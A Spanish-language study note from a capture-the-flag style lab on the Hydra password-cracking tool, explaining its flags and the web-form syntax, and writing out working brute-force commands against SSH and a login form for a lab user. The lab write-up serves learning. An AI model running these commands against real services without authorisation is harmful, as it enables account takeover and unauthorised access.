# Hydra

- **Link:** THM — Hydra — módulo Offensive Security Tooling
- **Fecha:** 2026-10-05
- **Dificultad:** Easy

## Conceptos clave
- **Hydra:** cracker de logins por red (fuerza bruta). Prueba muchas contraseñas rápido contra un servicio (SSH, FTP, formularios web, etc.).
- **Threads (`-t`):** cuántos intentos en paralelo. Más = más rápido pero más riesgo de saturar/errores/detección. SSH: `-t 4` (estable).
- **Wordlist:** archivo de contraseñas ya incluido en Kali. Estrella: `/usr/share/wordlists/rockyou.txt` (si viene `.gz`, `gunzip`). El `passlist.txt` del ejemplo es solo un nombre genérico.
- El servicio va al **final** del comando (`... ssh`), no como `ssh://` al inicio.

## Sintaxis
- Flags: `-l` usuario, `-L` lista de usuarios, `-P` lista de passwords, `-t` threads, `-V` verbose, `-s` puerto no estándar.

### SSH
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt <IP> -t 4 ssh
```

### Formulario web (POST)
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "<path>:<campos>:F=<msg_fallo>" -V
```
Las 3 partes entre comillas separadas por `:`
1. path del login (ej. `/login`)
2. campos con `^USER^` y `^PASS^` (ej. `username=^USER^&password=^PASS^`)
3. `F=<texto>` que aparece cuando el login FALLA

## Task 2 — práctica (usuario: molly)
Antes de atacar el form, inspeccioné la web:
- Path: `/login`
- Campos (del código fuente): `name="username"` y `name="password"`
- Mensaje de error al fallar: "Your username or password is incorrect." → usé `F=incorrect`

**Flag 1 (web):**
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.65.177.64 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```
→ `[REDACTADO]`

**Flag 2 (ssh):**
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.65.177.64 -t 4 ssh
```
Luego `ssh molly@IP` con la password encontrada → leer la flag.

## Lo que me costó / errores
- Usé `ftp://IP` (del ejemplo genérico) → "all children disabled, too many connection errors". FTP ni estaba abierto. El servicio correcto va al final: `ssh`.
- Para el form hay que mirar PRIMERO el código fuente (names de los campos) y el mensaje de error real (para `F=`).

## Resumen para documentar
Hydra automatiza fuerza bruta de credenciales. Para formularios web necesitas 3 datos de la propia web: el path, los names de los campos, y el texto de error (F=). Para SSH basta usuario + wordlist + `ssh` al final.
